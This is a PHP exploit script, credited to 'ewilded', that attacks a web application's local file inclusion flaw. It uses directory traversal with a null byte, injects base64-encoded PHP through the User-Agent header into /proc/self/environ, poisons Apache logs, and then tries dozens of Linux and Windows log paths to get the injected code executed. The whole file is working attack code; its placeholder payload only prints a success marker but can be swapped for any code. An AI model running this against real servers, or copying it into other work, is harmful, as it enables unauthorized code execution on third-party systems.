<?php
# LFI universal exploit by ewilded
# CONFIG
$host='phpseclab';
$port=80;
# REQUEST_FILENAME+QUERY_STRING TEMPLATE
$path_pattern='foo/index.php?vuln_var={holder}';
# CODE:
$phpcode_normal='die("EXECUTION_SUCCESFUL");';
# SUCCESFUL EXECUTION INDICATOR:
$success_indicator='EXECUTION_SUCCESFUL';

## LOGIC
error_reporting(E_ALL);
$phpcode='<?php eval(base64_decode("'.base64_encode($phpcode_normal).'"));?>';
function http_request($url,$uastring='')
{
	echo "Trying $url";
	if($uastring) echo " with User-Agent: $uastring";
	echo "...\n";
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch,CURLOPT_TIMEOUT,20);
	if($uastring) curl_setopt($ch, CURLOPT_HTTPHEADER, array("User-Agent: $uastring"));
	curl_setopt($ch,CURLOPT_HEADER,TRUE); 
	$content=curl_exec($ch);
	return $content;
}
function get_url($path)
{
	global $path_pattern;
	global $host;
	global $port;
	return "http://$host:$port/".str_replace('{holder}','./../../../../../../../../../../../../../../../../../../../../../../..'.$path.'%00',$path_pattern);
}

// First, let's try /proc/self/environ
$ret=http_request(get_url('/proc/self/environ'),$phpcode);
if(preg_match("/$success_indicator/",$ret)) die("Exploitation succesful!\n");
// Second, /proc/self/fd/3 and others..

// Third, httpd log files
http_request(get_url("$phpcode")); ## inject code into error/access_log
$httpd_log_files=array('/etc/httpd/logs/access.log','/etc/httpd/logs/access_log','/etc/httpd/logs/error.log','/etc/httpd/logs/error_log','/opt/lampp/logs/access_log', '/opt/lampp/logs/error_log', '/usr/local/apache/log', '/usr/local/apache/logs/access.log', '/usr/local/apache/logs/access.log', '/usr/local/apache/logs/access_log','/usr/local/apache/logs/error.log','/usr/local/apache/logs/error_log', '/usr/local/etc/httpd/logs/access_log', '/usr/local/etc/httpd/logs/error_log', '/usr/local/www/logs/thttpd_log','/var/apache/logs/access_log','/var/apache/logs/error_log','/var/log/apache/access.log','/var/log/apache/error.log','/var/log/apache-ssl/access.log','/var/log/apache-ssl/error.log', '/var/log/httpd/access_log', '/var/log/httpd/error_log','/var/log/httpsd/ssl.access_log','/var/log/httpsd/ssl_log','/var/log/thttpd_log', '/var/www/log/access_log', '/var/www/log/error_log', '/var/www/logs/access.log', '/var/www/logs/access_log', '/var/www/logs/error.log', '/var/www/logs/error_log', 'C:\apache\logs\access.log', 'C:\apache\logs\error.log', 'C:\Program Files\Apache Group\Apache\logs\access.log', 'C:\Program Files\Apache Group\Apache\logs\error.log', 'C:\program files\wamp\apache2\logs','C:\wamp\apache2\logs', 'C:\wamp\logs', 'C:\xampp\apache\logs\access.log', 'C:\xampp\apache\logs\error.log');
 
foreach($httpd_log_files as $log_file) 
{
 if(preg_match("/$success_indicator/",http_request(get_url($log_file)))) die("Exploitation succesful with $log_file!\n");
 sleep(1);
} 
// next, try FTP
// and other sick locations, like sessions, mailing (try finding all +rw files on the system for the inspiration)
// SEE LFI_EXPLOITATION_HOWTO FOR MORE OPTIONS TO IMPLEMENT HERE
echo "Exploit failed!\n";
?>